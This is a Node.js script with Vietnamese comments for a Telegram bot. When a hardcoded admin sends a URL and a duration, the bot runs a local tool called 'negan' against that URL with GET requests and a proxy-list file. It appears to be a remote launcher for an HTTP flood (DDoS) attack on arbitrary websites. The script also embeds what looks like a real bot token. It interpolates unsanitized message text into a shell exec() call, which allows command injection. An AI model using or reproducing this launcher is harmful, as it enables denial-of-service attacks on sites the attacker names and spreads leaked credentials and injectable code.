const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Thay thế bằng token của bot Telegram của bạn
const token = '8129263243:AAFoQBpm5Uv1F_ZNBPFf2bRSkJsJafcLG7A';
const bot = new TelegramBot(token, { polling: true });

// ID của admin
const adminId = 7371969470;

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // Kiểm tra xem tin nhắn có đến từ admin không
    if (chatId === adminId) {
        // Kiểm tra định dạng tin nhắn
        const parts = text.split(' ');
        if (parts.length === 2 && parts[0].startsWith('http')) {
            const [host, time] = parts;

            // Kiểm tra xem URL có hợp lệ không
            if (host.startsWith('http://') || host.startsWith('https://')) {
                // Chạy lệnh node ./negan với host và time
                const command = `node ./negan -m GET -u ${host} -p 1.txt --full true -s ${time}`;
                exec(command, (error, stdout, stderr) => {
                    if (error) {
                        bot.sendMessage(chatId, `Lỗi: ${error.message}`);
                        return;
                    }
                    if (stderr) {
                        bot.sendMessage(chatId, `Lỗi: ${stderr}`);
                        return;
                    }
                    // Thông báo thành công về Telegram
                    bot.sendMessage(chatId, `Lệnh đã được thực thi thành công!\nKết quả: ${stdout}`);
                });
            } else {
                bot.sendMessage(chatId, 'URL không hợp lệ. Vui lòng nhập URL đầy đủ với http:// hoặc https://.');
            }
        } else {
            bot.sendMessage(chatId, 'Định dạng tin nhắn không đúng. Vui lòng nhập theo định dạng: <URL> <time>.');
        }
    } else {
        bot.sendMessage(chatId, 'Bạn không có quyền thực hiện lệnh này.');
    }
});
